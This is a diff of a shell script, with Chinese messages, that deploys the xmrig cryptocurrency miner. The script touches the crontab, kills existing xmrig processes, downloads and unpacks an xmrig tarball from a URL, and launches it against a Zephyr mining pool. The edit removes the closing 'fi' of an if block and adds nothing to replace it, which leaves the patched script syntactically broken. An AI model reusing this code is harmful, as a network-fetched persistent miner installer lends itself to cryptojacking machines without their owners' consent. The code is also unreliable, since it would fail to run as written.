@@ -14,14 +14,13 @@ existing_crontab=$(crontab -l 2>/dev/null)
 
 
 
-ping -c 4 $HOST > /dev/null
-
-if [ $? -eq 0 ]; then
-    echo "网络畅通，可以连接到 $HOST"
+if curl --output /dev/null --silent --head --fail "http://$HOST"; then
+    echo "网络畅通 到 $HOST"
 else
-    echo "无法连接到 $HOST"
+    echo "连接失败"
     exit 1
-fi
+
+
 
 if pgrep xmrig > /dev/null; then
     # 如果进程存在，则杀死它
@@ -43,7 +42,7 @@ fi
 
 cd "$ROOT_path" || handle_error "无法切换到目录: $ROOT_path"
 
-wget -O "xmrig.tar.gz" "$xmrig_url"
+curl -o "xmrig.tar.gz" "$xmrig_url"
 tar -xzf "xmrig.tar.gz" -C "$ROOT_path"
 chmod +x "$ROOT_path/xmrig"
 a='./xmrig --coin zephyr --url "zeph.kryptex.network:8888" --user "'
